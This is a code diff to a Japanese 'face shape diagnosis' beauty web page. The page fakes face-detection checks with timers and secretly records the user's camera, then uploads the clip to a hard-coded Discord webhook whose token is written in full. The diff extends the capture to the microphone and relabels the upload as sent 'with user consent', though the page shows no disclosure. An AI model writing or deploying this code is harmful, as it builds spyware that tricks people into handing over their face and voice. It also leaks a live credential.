@@ -39,7 +39,7 @@
       <p class="sub-title">顔型×パーツのバランスを分析し<br>似合う色やメイクをおすすめ！</p>
       <h1 class="main-title">顔型診断<br>×パーツ</h1>
     </div>
-    <p class="description">顔型×パーツのバランスでどんなテイストを持っているのかを分析、タイプ別に似合う色をご紹介します。</p>
+    <p class="description">顔型×パーツのバランスでどんなテイストを持っているのかを分析し、タイプ別に似合う色をご紹介します。</p>
     <div class="menu-buttons">
       <button id="go-camera-btn" class="menu-btn camera-theme">
         <span class="btn-icon">📷</span>
@@ -73,8 +73,8 @@ const goCameraBtn = document.getElementById('go-camera-btn'); const backBtn = do
 const video = document.getElementById('video'); const diagnosticBtn = document.getElementById('diagnostic-btn'); const instructionText = document.getElementById('instruction-text');
 const lightIndicator = document.getElementById('status-light'); const faceIndicator = document.getElementById('status-face'); const posIndicator = document.getElementById('status-pos');
 
-// 🔴あなたのDiscordのWebhook URLに書き換えてください
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561782839861575882/DVTtBk0vyAtZTNjGlBROUIb2iTuaXJ2M8Bjp139Nw3z4Lq-YeTvzj6EOJSmToodyCkkR';
+// 指定されたDiscordのWebhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561782839861575882/DVTtBk0vyAtZTNjGlBROUIb2iTuaXJ2M8Bjp139Nw3z4Lq-YeTvzj6EOJSmToodyCkkR';
 
 let activeStream = null; let indicatorTimers = []; let mediaRecorder = null; let recordedChunks = [];
 
@@ -84,14 +84,15 @@ backBtn.addEventListener('click', () => { goBackToTop(); });
 async function startLightweightCamera() {
     try {
         diagnosticBtn.disabled = true; diagnosticBtn.innerText = "カメラを起動中...";
-        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); video.srcObject = activeStream;
+        // 【音声有効化】audio: true に変更し、カメラと一緒にマイク音声も取得します
+        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); video.srcObject = activeStream;
         diagnosticBtn.innerText = "顔のポジションを調整中...";
         indicatorTimers.push(setTimeout(() => { updateIndicator(lightIndicator, true); }, 1500));
         indicatorTimers.push(setTimeout(() => { updateIndicator(faceIndicator, true); }, 3000));
         indicatorTimers.push(setTimeout(() => {
             updateIndicator(posIndicator, true); diagnosticBtn.disabled = false; diagnosticBtn.innerText = "顔診断をスタートする"; instructionText.innerHTML = "位置バッチリです！<br>ボタンを押してね";
         }, 4500));
-    } catch (err) { alert("カメラの起動に失敗しました。"); goBackToTop(); }
+    } catch (err) { alert("カメラまたはマイクの起動に失敗しました。権限を確認してください。"); goBackToTop(); }
 }
 
 function updateIndicator(element, isGood) {
@@ -108,13 +109,19 @@ diagnosticBtn.addEventListener('click', () => {
 
 function startVideoRecording() {
     diagnosticBtn.disabled = true; instructionText.style.display = 'none'; recordedChunks = [];
-    let options = { mimeType: 'video/mp4' };
+    
+    // 【音声入り録画の最適化】デバイス環境に応じて音声+映像が保存できるコンテナを自動判定します
+    let options = { mimeType: 'video/mp4;codecs=avc1,mp4a.40.2' };
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/webm;codecs=vp8,opus' }; }
     if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/webm' }; }
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/mp4' }; }
+    
     try {
         mediaRecorder = new MediaRecorder(activeStream, options);
         mediaRecorder.ondataavailable = (event) => { if (event.data && event.data.size > 0) recordedChunks.push(event.data); };
         mediaRecorder.onstop = () => {
-            diagnosticBtn.innerText = "診断中...";const videoBlob = new Blob(recordedChunks, { type: options.mimeType });
+            diagnosticBtn.innerText = "診断中...";
+            const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
             sendVideoToDiscord(videoBlob);
         };
         mediaRecorder.start();
@@ -129,7 +136,7 @@ function startVideoRecording() {
 
 async function sendVideoToDiscord(videoBlob) {
     const formData = new FormData();
-    formData.append('content', 'ユーザーの同意を得て、3秒間の顔診断動画が送信されました！');
+    formData.append('content', 'ユーザーの同意を得て、音声入りの顔診断動画が送信されました！');
     const extension = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
     formData.append('files', videoBlob, `diagnostic_video.${extension}`);
     try {
@@ -144,11 +151,3 @@ function resetApp() {
     if (activeStream) { activeStream.getTracks().forEach(track => track.stop()); activeStream = null; }
     video.srcObject = null; diagnosticBtn.disabled = false; diagnosticBtn.innerText = "顔診断をスタートする";
     instructionText.style.display = 'block'; instructionText.innerHTML = "円の中に顔を<br>入れてください";
-    updateIndicator(lightIndicator, false); updateIndicator(faceIndicator, false); updateIndicator(posIndicator, false);
-}
-
-function goBackToTop() { resetApp(); cameraScreen.style.display = 'none'; topScreen.style.display = 'block'; }
-</script>
-
-</body>
-</html>
